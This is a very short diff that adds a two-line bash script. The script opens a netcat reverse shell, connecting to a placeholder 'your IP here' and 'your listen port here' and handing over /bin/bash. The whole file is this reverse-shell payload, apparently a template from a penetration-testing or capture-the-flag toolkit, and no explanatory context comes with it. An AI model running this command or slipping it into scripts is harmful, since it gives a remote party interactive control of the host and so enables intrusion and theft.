@@ -1,0 +1,2 @@
+#!/bin/bash
+nc <!!! your IP here !!!> <!!! your listen port here !!!> -e /bin/bash
